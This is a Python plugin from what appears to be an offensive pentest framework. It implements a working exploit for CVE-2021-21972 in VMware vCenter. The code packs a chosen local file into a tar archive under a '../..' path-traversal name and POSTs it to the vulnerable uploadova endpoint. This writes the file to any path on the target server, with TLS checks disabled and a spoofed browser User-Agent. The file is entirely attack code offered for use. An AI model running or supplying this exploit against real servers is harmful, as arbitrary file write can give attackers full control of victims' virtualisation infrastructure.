import argparse
from copy import copy

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes
import requests, tarfile, io


class PluginVCenterxx(PluginVCenterBase):
    display = "CVE-2021-21972"
    alias = "cve_2021_21972"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", required=True, dest="address")
        parser.add_argument("-p", "--proxy", help="proxy", dest="proxy")
        parser.add_argument("-l", "--local-file", help="local file", required=True, dest="local_file")
        parser.add_argument("-t", "--target-file", help="target file", required=True, dest="target_file")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)
        ip = args.address
        proxy = args.proxy
        local_file = args.local_file
        target_file = args.target_file

        vuln_path = '/ui/vropspluginui/rest/services/uploadova'
        tf = io.BytesIO()
        with tarfile.open(fileobj=tf, mode='w') as f:
            f.add(local_file, f'../..{target_file}')
        try:
            r = requests.post(
                f'https://{ip}{vuln_path}',
                files={"uploadFile": tf.getvalue()},
                proxies=proxy,
                verify=False,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                                  'Chrome/88.0.4324.182 Safari/537.36 '
                }
            )
            output.success(f"{r.status_code}\n"
                           f"{r.text}")
        except Exception as e:
            output.error(e)

        return result
